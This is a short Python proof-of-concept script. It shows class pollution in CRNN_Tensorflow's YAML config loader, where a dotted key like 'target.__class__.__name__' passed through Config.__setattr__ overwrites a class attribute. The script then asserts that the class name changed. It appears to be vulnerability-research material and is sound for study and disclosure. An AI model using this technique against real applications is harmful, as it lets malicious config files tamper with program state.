# CLASS POLLUTION PROOF OF CONCEPT (PoC) - Local Trigger
# Class Pollution Func: Config.__setattr__ (via YAML config file)
# Type: get-attr-set-attr
# Trigger: YAML config file with dotted key paths
#
# CRNN_Tensorflow loads config from YAML files. The Config class overrides
# __setattr__ to split keys on "." and traverse via __getattr__.
# A malicious config file with keys like "target.__class__.__name__" 
# triggers class pollution when the config is loaded.

import sys
import os
import yaml
import tempfile

sys.path.insert(0, os.path.join(os.path.dirname(__file__), '..', '..', 'poc', 'library', 'repo'))

from local_utils.config_utils.parse_config_utils import Config

class Target: pass
target = Target()

payload_value = "pwnd"

def run_poc():
  # Create a malicious YAML config file
  malicious_config = {"target.__class__.__name__": payload_value}
  
  cfg = Config()
  cfg["target"] = target
  
  # Simulates loading config: each key goes through Config.__setattr__
  # which splits on "." and traverses via getattr
  for key, value in malicious_config.items():
    cfg.__setattr__(key, value)

def verify_poc():
  assert target.__class__.__name__ != payload_value, "Pre-condition failed"
  run_poc()
  print(f"After: target.__class__.__name__ = {target.__class__.__name__}")
  assert target.__class__.__name__ == payload_value, "Class pollution failed!"
  print("[Pass] Class pollution PoC verified! (local trigger)")

if __name__ == "__main__":
  verify_poc()
